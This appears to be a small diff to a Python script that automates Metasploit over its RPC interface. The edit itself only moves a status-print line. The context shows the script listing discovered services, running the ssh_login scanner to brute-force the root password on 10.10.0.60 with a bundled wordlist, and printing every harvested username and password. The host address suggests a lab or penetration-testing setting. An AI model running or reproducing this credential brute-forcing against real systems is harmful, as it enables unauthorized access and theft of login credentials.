@@ -34,13 +34,13 @@ for s in workspace.services.list:
     print("host:%s  service:%s  port:%s" % (s['host'],s['name'],s['port']))
 
 
+pw("\nFinding SSH root creds:")
 exploit = client.modules.use(mtype='auxiliary', mname='scanner/ssh/ssh_login')
 exploit['RHOSTS'] = '10.10.0.60'
 exploit['THREADS'] = 5
 exploit['USERNAME'] = 'root'
 exploit['PASS_FILE'] = '/usr/share/metasploit-framework/data/wordlists/password.lst'
 result = console.run_module_with_output(exploit)
-pw("\nFind SSH root creds:")
 #print(workspace.creds.list)
 for c in workspace.creds.list:
     print("host: %s userName: %s  password: %s" % (c['host'],c['user'],c['pass']))
